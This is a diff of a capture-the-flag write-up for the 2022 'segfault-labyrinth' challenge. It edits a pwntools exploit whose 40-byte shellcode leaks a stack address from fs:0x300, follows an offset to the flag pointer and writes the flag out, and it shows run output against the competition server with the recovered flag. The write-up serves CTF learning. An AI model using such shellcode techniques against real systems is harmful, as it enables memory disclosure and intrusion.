@@ -412,16 +412,18 @@ else:
 shellcode = asm(f'''
 mov rsi, qword ptr [fs:0 + 0x300]
 mov rsi, qword ptr [rsi - 0x2f0]
-mov rdi, 1
+xor rdi, rdi
 mov rdx, 100
 mov eax, {constants.SYS_write}
 syscall
-xor rdi, rdi
 mov eax, {constants.SYS_exit}
 syscall
 ''')
 
-if args.D: print(disasm(shellcode))
+if args.D:
+    print(disasm(shellcode))
+    log.info('len(shellcode) = {x}'.format(x = len(shellcode)))
+
 assert(len(shellcode) < 0x1000)
 p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
 p.send(shellcode)
@@ -432,6 +434,27 @@ print(_)
 
 Get a stack leak from `fs:0 + 0x300`, then use the offset to the flag pointer (use GDB to figure it out).
 
-> I did not need to match libc versions.
+> No need to match libc versions.
 > 
 > I didn't try this approach at first since I knew exactly what would work (dump 16 predictable `rand()` locations).
+> 
+> _`write` out FD `0`?!_  Yeah, you can do that.
+
+40 bytes:
+
+```
+# ./exploit4.1.py D=1 REMOTE=1
+[+] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
+   0:   64 48 8b 34 25 00 03    mov    rsi, QWORD PTR fs:0x300
+   7:   00 00
+   9:   48 8b b6 10 fd ff ff    mov    rsi, QWORD PTR [rsi-0x2f0]
+  10:   48 31 ff                xor    rdi, rdi
+  13:   48 c7 c2 64 00 00 00    mov    rdx, 0x64
+  1a:   b8 01 00 00 00          mov    eax, 0x1
+  1f:   0f 05                   syscall
+  21:   b8 3c 00 00 00          mov    eax, 0x3c
+  26:   0f 05                   syscall
+[*] len(shellcode) = 40
+[*] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
+CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
+```
